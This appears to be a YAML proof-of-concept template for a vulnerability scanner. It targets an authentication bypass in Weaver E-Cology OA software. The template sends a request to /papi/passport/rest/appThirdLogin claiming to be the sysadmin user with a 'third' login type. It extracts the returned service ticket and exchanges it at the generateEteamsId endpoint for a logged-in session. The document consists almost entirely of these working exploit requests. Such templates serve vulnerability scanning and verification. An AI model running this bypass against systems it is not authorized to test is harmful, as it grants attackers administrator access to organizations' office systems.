name: poc-yaml-WeaverOA-E-Cology-appThirdLogin-Authentication-bypass
transport: http
  

rules:
  r0:
    request:
      method: POST
      path: /papi/passport/rest/appThirdLogin
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Content-Type: application/x-www-form-urlencoded
      body: username=sysadmin&service=1&ip=1&loginType=third
    expression: response.status == 200
    output:
      search: '"serviceTicketId\":\"(?P<uploadfile>[^\"]+)".bsubmatch(response.body)'
      uploadfile: search["uploadfile"]

  r1:
    request:
      method: POST
      path: /papi/passport/login/generateEteamsId
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Content-Type: application/x-www-form-urlencoded
      body: stTicket={{uploadfile}}
    expression: response.status == 200 && response.body.bcontains(b'接口返回成功') && response.body.bcontains(b'"data":')
expression: r0() && r1()

detail:
  author: Superhero
  links:
